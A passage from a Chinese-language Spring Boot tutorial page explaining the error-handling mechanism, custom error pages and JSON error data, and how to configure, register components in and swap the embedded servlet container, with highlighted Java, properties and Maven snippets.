class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasicErrorController</span> <span class="keyword">extends</span> <span class="title">AbstractErrorController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping</span>(produces = <span class="string">"text/html"</span>)<span class="comment">//产生html类型的数据；浏览器发送的请求来到这个方法处理</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">errorHtml</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">HttpStatus status = getStatus(request);</span><br><span class="line">Map&lt;String, Object&gt; model = Collections.unmodifiableMap(getErrorAttributes(</span><br><span class="line">request, isIncludeStackTrace(request, MediaType.TEXT_HTML)));</span><br><span class="line">response.setStatus(status.value());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//去哪个页面作为错误页面；包含页面地址和页面内容</span></span><br><span class="line">ModelAndView modelAndView = resolveErrorView(request, response, status, model);</span><br><span class="line"><span class="keyword">return</span> (modelAndView == <span class="keyword">null</span> ? <span class="keyword">new</span> ModelAndView(<span class="string">"error"</span>, model) : modelAndView);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span></span><br><span class="line"><span class="meta">@ResponseBody</span>    <span class="comment">//产生json数据，其他客户端来到这个方法处理；</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Map&lt;String, Object&gt;&gt; error(HttpServletRequest request) &#123;</span><br><span class="line">Map&lt;String, Object&gt; body = getErrorAttributes(request,</span><br><span class="line">isIncludeStackTrace(request, MediaType.ALL));</span><br><span class="line">HttpStatus status = getStatus(request);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> ResponseEntity&lt;Map&lt;String, Object&gt;&gt;(body, status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、ErrorPageCustomizer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value</span>(<span class="string">"$&#123;error.path:/error&#125;"</span>)</span><br><span class="line"><span class="keyword">private</span> String path = <span class="string">"/error"</span>;  系统出现错误以后来到error请求进行处理；（web.xml注册的错误页面规则）</span><br></pre></td></tr></table></figure><p>​    4、DefaultErrorViewResolver：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">resolveErrorView</span><span class="params">(HttpServletRequest request, HttpStatus status,</span></span></span><br><span class="line"><span class="function"><span class="params">Map&lt;String, Object&gt; model)</span> </span>&#123;</span><br><span class="line">ModelAndView modelAndView = resolve(String.valueOf(status), model);</span><br><span class="line"><span class="keyword">if</span> (modelAndView == <span class="keyword">null</span> &amp;&amp; SERIES_VIEWS.containsKey(status.series())) &#123;</span><br><span class="line">modelAndView = resolve(SERIES_VIEWS.get(status.series()), model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> ModelAndView <span class="title">resolve</span><span class="params">(String viewName, Map&lt;String, Object&gt; model)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//默认SpringBoot可以去找到一个页面？  error/404</span></span><br><span class="line">String errorViewName = <span class="string">"error/"</span> + viewName;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//模板引擎可以解析这个页面地址就用模板引擎解析</span></span><br><span class="line">TemplateAvailabilityProvider provider = <span class="keyword">this</span>.templateAvailabilityProviders</span><br><span class="line">.getProvider(errorViewName, <span class="keyword">this</span>.applicationContext);</span><br><span class="line"><span class="keyword">if</span> (provider != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//模板引擎可用的情况下返回到errorViewName指定的视图地址</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(errorViewName, model);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//模板引擎不可用，就在静态资源文件夹下找errorViewName对应的页面   error/404.html</span></span><br><span class="line"><span class="keyword">return</span> resolveResource(errorViewName, model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    步骤：</p><p>​        一但系统出现4xx或者5xx之类的错误；ErrorPageCustomizer就会生效（定制错误的响应规则）；就会来到/error请求；就会被<strong>BasicErrorController</strong>处理；</p><p>​        1）响应页面；去哪个页面是由<strong>DefaultErrorViewResolver</strong>解析得到的；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">resolveErrorView</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">      HttpServletResponse response, HttpStatus status, Map&lt;String, Object&gt; model)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//所有的ErrorViewResolver得到ModelAndView</span></span><br><span class="line">   <span class="keyword">for</span> (ErrorViewResolver resolver : <span class="keyword">this</span>.errorViewResolvers) &#123;</span><br><span class="line">      ModelAndView modelAndView = resolver.resolveErrorView(request, status, model);</span><br><span class="line">      <span class="keyword">if</span> (modelAndView != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> modelAndView;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="2-如果定制错误响应">2）、如果定制错误响应：</span></h3><h4><span id="1-如何定制错误的页面"><strong>1）、如何定制错误的页面；</strong></span></h4><p>​            <strong>1）、有模板引擎的情况下；error/状态码;</strong> 【将错误页面命名为  错误状态码.html 放在模板引擎文件夹里面的 error文件夹下】，发生此状态码的错误就会来到  对应的页面；</p><p>​            我们可以使用4xx和5xx作为错误页面的文件名来匹配这种类型的所有错误，精确优先（优先寻找精确的状态码.html）；        </p><p>​            页面能获取的信息；</p><p>​                timestamp：时间戳</p><p>​                status：状态码</p><p>​                error：错误提示</p><p>​                exception：异常对象</p><p>​                message：异常消息</p><p>​                errors：JSR303数据校验的错误都在这里</p><p>​            2）、没有模板引擎（模板引擎找不到这个错误页面），静态资源文件夹下找；</p><p>​            3）、以上都没有错误页面，就是默认来到SpringBoot默认的错误提示页面；</p><h4><span id="2-如何定制错误的json数据">2）、如何定制错误的json数据；</span></h4><p>​        1）、自定义异常处理&amp;返回定制json数据；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyExceptionHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ExceptionHandler</span>(UserNotExistException<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">Map</span>&lt;<span class="title">String</span>,<span class="title">Object</span>&gt; <span class="title">handleException</span>(<span class="title">Exception</span> <span class="title">e</span>)</span>&#123;</span><br><span class="line">        Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"code"</span>,<span class="string">"user.notexist"</span>);</span><br><span class="line">        map.put(<span class="string">"message"</span>,e.getMessage());</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//没有自适应效果...</span></span><br></pre></td></tr></table></figure><p>​        2）、转发到/error进行自适应响应效果处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ExceptionHandler</span>(UserNotExistException<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">   <span class="title">public</span> <span class="title">String</span> <span class="title">handleException</span>(<span class="title">Exception</span> <span class="title">e</span>, <span class="title">HttpServletRequest</span> <span class="title">request</span>)</span>&#123;</span><br><span class="line">       Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">       <span class="comment">//传入我们自己的错误状态码  4xx 5xx，否则就不会进入定制错误页面的解析流程</span></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Integer statusCode = (Integer) request</span></span><br><span class="line"><span class="comment">        .getAttribute("javax.servlet.error.status_code");</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       request.setAttribute(<span class="string">"javax.servlet.error.status_code"</span>,<span class="number">500</span>);</span><br><span class="line">       map.put(<span class="string">"code"</span>,<span class="string">"user.notexist"</span>);</span><br><span class="line">       map.put(<span class="string">"message"</span>,e.getMessage());</span><br><span class="line">       <span class="comment">//转发到/error</span></span><br><span class="line">       <span class="keyword">return</span> <span class="string">"forward:/error"</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4><span id="3-将我们的定制数据携带出去">3）、将我们的定制数据携带出去；</span></h4><p>出现错误以后，会来到/error请求，会被BasicErrorController处理，响应出去可以获取的数据是由getErrorAttributes得到的（是AbstractErrorController（ErrorController）规定的方法）；</p><p>​    1、完全来编写一个ErrorController的实现类【或者是编写AbstractErrorController的子类】，放在容器中；</p><p>​    2、页面上能用的数据，或者是json返回能用的数据都是通过errorAttributes.getErrorAttributes得到；</p><p>​            容器中DefaultErrorAttributes.getErrorAttributes()；默认进行数据处理的；</p><p>自定义ErrorAttributes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//给容器中加入我们自己定义的ErrorAttributes</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyErrorAttributes</span> <span class="keyword">extends</span> <span class="title">DefaultErrorAttributes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">getErrorAttributes</span><span class="params">(RequestAttributes requestAttributes, <span class="keyword">boolean</span> includeStackTrace)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">super</span>.getErrorAttributes(requestAttributes, includeStackTrace);</span><br><span class="line">        map.put(<span class="string">"company"</span>,<span class="string">"atguigu"</span>);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终的效果：响应是自适应的，可以通过定制ErrorAttributes改变需要返回的内容，</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180228135513.png" alt></p><h2><span id="8-配置嵌入式servlet容器">8、配置嵌入式Servlet容器</span></h2><p>SpringBoot默认使用Tomcat作为嵌入式的Servlet容器；</p><p><img src="images/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180301142915.png" alt></p><p>问题？</p><h3><span id="1-如何定制和修改servlet容器的相关配置">1）、如何定制和修改Servlet容器的相关配置；</span></h3><p>1、修改和server有关的配置（ServerProperties【也是EmbeddedServletContainerCustomizer】）；</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="meta">server.context-path</span>=<span class="string">/crud</span></span><br><span class="line"></span><br><span class="line"><span class="meta">server.tomcat.uri-encoding</span>=<span class="string">UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">//通用的Servlet容器设置</span></span><br><span class="line"><span class="attr">server.xxx</span></span><br><span class="line"><span class="attr">//Tomcat的设置</span></span><br><span class="line"><span class="attr">server.tomcat.xxx</span></span><br></pre></td></tr></table></figure><p>2、编写一个<strong>EmbeddedServletContainerCustomizer</strong>：嵌入式的Servlet容器的定制器；来修改Servlet容器的配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span>  <span class="comment">//一定要将这个定制器加入到容器中</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> EmbeddedServletContainerCustomizer <span class="title">embeddedServletContainerCustomizer</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> EmbeddedServletContainerCustomizer() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定制嵌入式的Servlet容器相关的规则</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(ConfigurableEmbeddedServletContainer container)</span> </span>&#123;</span><br><span class="line">            container.setPort(<span class="number">8083</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="2-注册servlet三大组件servlet-filter-listener">2）、注册Servlet三大组件【Servlet、Filter、Listener】</span></h3><p>由于SpringBoot默认是以jar包的方式启动嵌入式的Servlet容器来启动SpringBoot的web应用，没有web.xml文件。</p><p>注册三大组件用以下方式</p><p>ServletRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册三大组件</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ServletRegistrationBean <span class="title">myServlet</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ServletRegistrationBean registrationBean = <span class="keyword">new</span> ServletRegistrationBean(<span class="keyword">new</span> MyServlet(),<span class="string">"/myServlet"</span>);</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FilterRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FilterRegistrationBean <span class="title">myFilter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FilterRegistrationBean registrationBean = <span class="keyword">new</span> FilterRegistrationBean();</span><br><span class="line">    registrationBean.setFilter(<span class="keyword">new</span> MyFilter());</span><br><span class="line">    registrationBean.setUrlPatterns(Arrays.asList(<span class="string">"/hello"</span>,<span class="string">"/myServlet"</span>));</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ServletListenerRegistrationBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ServletListenerRegistrationBean <span class="title">myListener</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ServletListenerRegistrationBean&lt;MyListener&gt; registrationBean = <span class="keyword">new</span> ServletListenerRegistrationBean&lt;&gt;(<span class="keyword">new</span> MyListener());</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpringBoot帮我们自动SpringMVC的时候，自动的注册SpringMVC的前端控制器；DIspatcherServlet；</p><p>DispatcherServletAutoConfiguration中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span>(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)</span><br><span class="line"><span class="meta">@ConditionalOnBean</span>(value = DispatcherServlet<span class="class">.<span class="keyword">class</span>, <span class="title">name</span> </span>= DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ServletRegistrationBean <span class="title">dispatcherServletRegistration</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      DispatcherServlet dispatcherServlet)</span> </span>&#123;</span><br><span class="line">   ServletRegistrationBean registration = <span class="keyword">new</span> ServletRegistrationBean(</span><br><span class="line">         dispatcherServlet, <span class="keyword">this</span>.serverProperties.getServletMapping());</span><br><span class="line">    <span class="comment">//默认拦截： /  所有请求；包静态资源，但是不拦截jsp请求；   /*会拦截jsp</span></span><br><span class="line">    <span class="comment">//可以通过server.servletPath来修改SpringMVC前端控制器默认拦截的请求路径</span></span><br><span class="line">    </span><br><span class="line">   registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME);</span><br><span class="line">   registration.setLoadOnStartup(</span><br><span class="line">         <span class="keyword">this</span>.webMvcProperties.getServlet().getLoadOnStartup());</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.multipartConfig != <span class="keyword">null</span>) &#123;</span><br><span class="line">      registration.setMultipartConfig(<span class="keyword">this</span>.multipartConfig);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> registration;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）、SpringBoot能不能支持其他的Servlet容器；</p><h3><span id="3-替换为其他嵌入式servlet容器">3）、替换为其他嵌入式Servlet容器</span></h3><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302114401.png" alt></p><p>默认支持：</p><p>Tomcat（默认使用）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   引入web模块默认就是使用嵌入式的Tomcat作为Servlet容器；</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Jetty</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入web模块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入其他的Servlet容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Undertow</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入web模块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入其他的Servlet容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-undertow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="4-嵌入式servlet容器自动配置原理">4）、嵌入式Servlet容器自动配置原理；</span></h3><p>EmbeddedServletContainerAutoConfiguration：嵌入式的Servlet容器自动配置？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigureOrder</span>(Ordered.HIGHEST_PRECEDENCE)</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@Import</span>(BeanPostProcessorsRegistrar<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">//导入<span class="title">BeanPostProcessorsRegistrar</span>：<span class="title">Spring</span>注解版；给容器中导入一些组件</span></span><br><span class="line"><span class="class">//导入了<span class="title">EmbeddedServletContainerCustomizerBeanPostProcessor</span>：</span></span><br><span class="line"><span class="class">//后置处理器：<span class="title">bean</span>初始化前后（创建完对象，还没赋值赋值）执行初始化工作</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">EmbeddedServletContainerAutoConfiguration</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(&#123; Servlet<span class="class">.<span class="keyword">class</span>, <span class="title">Tomcat</span>.<span class="title">class</span> &#125;)//判断当前是否引入了<span class="title">Tomcat</span>依赖；</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnMissingBean</span>(<span class="title">value</span> </span>= EmbeddedServletContainerFactory<span class="class">.<span class="keyword">class</span>, <span class="title">search</span> </span>= SearchStrategy.CURRENT)<span class="comment">//判断当前容器没有用户自己定义EmbeddedServletContainerFactory：嵌入式的Servlet容器工厂；作用：创建嵌入式的Servlet容器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EmbeddedTomcat</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> TomcatEmbeddedServletContainerFactory <span class="title">tomcatEmbeddedServletContainerFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> TomcatEmbeddedServletContainerFactory();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Nested configuration if Jetty is being used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span 